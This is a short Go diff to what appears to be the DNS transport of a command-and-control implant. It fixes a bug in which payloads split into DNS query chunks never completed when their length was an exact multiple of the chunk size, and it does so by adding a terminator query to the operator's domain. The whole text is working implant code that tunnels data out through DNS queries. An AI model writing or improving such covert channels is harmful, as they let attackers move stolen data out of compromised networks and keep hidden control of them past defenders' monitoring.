@@ -76,7 +76,14 @@ func (t *DNS) query(name string) ([]string, error) {
 }
 
 // sendMultiUpload splits payload into CHUNK_SIZE pieces and uploads each.
+// The server treats a short (< CHUNK_SIZE) chunk as the last one, so a
+// payload whose length is an exact multiple of CHUNK_SIZE would never
+// complete: every chunk is full-length and the message buffers until TTL
+// while the implant polls "P" to its own timeout. Close that case with an
+// explicit `ue.<msgid>.<n>.<domain>` terminator carrying the chunk count;
+// the server only dispatches when it holds exactly those n chunks.
 func (t *DNS) sendMultiUpload(marker, msgid string, payload []byte) error {
+	n := 0
 	for i := 0; i < len(payload); i += dnsChunkSize {
 		end := i + dnsChunkSize
 		if end > len(payload) {
@@ -89,6 +96,16 @@ func (t *DNS) sendMultiUpload(marker, msgid string, payload []byte) error {
 		}
 		if len(recs) != 1 || recs[0] != "ok" {
 			return fmt.Errorf("dns: upload rejected (%v)", recs)
+		}
+		n++
+	}
+	if n > 0 && len(payload)%dnsChunkSize == 0 {
+		recs, err := t.query(fmt.Sprintf("ue.%s.%d.%s", msgid, n, t.domain))
+		if err != nil {
+			return err
+		}
+		if len(recs) != 1 || recs[0] != "ok" {
+			return fmt.Errorf("dns: terminator rejected (%v)", recs)
 		}
 	}
 	return nil
